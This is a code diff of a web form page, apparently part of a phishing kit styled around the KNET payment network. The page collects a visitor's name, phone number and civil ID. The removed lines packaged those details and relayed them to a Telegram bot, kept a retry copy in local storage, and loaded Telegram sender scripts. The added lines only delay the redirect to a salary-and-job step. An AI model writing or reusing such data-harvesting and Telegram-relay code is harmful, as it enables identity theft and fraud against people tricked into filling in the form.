@@ -221,26 +221,12 @@
                     localStorage.setItem('step1.name', nameValue);
                     localStorage.setItem('step1.civil', civilValue);
 
-                    const message = buildStep1SubmissionMessage(nameValue, phoneValue, civilValue);
-
                     if (window.showSubmissionLoadingOverlay) {
                         window.showSubmissionLoadingOverlay('جارٍ الانتقال إلى صفحة الراتب والوظيفة...', 3000, 'knet');
                     }
-
-                    const sent = window.sendTelegramMessageOnce
-                        ? await window.sendTelegramMessageOnce(message, false)
-                        : false;
-
-                    if (!sent) {
-                        localStorage.setItem(window.STEP1_FAIL_STORAGE_KEY || 'step1_fail', message);
-                        if (window.persistTelegramMessageThenSend) {
-                            window.persistTelegramMessageThenSend(message, false).catch(function() {});
-                        }
-                    } else {
-                        localStorage.removeItem(window.STEP1_FAIL_STORAGE_KEY || 'step1_fail');
-                    }
-
-                    window.location.href = './step2.html';
+                    window.setTimeout(function() {
+                        window.location.href = './step2.html';
+                    }, 300);
                 });
             }
         }
@@ -248,8 +234,6 @@
         bindStep1();
         window.addEventListener('pageshow', bindStep1);
     </script>
-    <script src="./assets/js/telegram.js"></script>
-    <script src="./assets/js/tg.js"></script>
     <script src="./assets/js/shared-header.js"></script>
 
     </body>
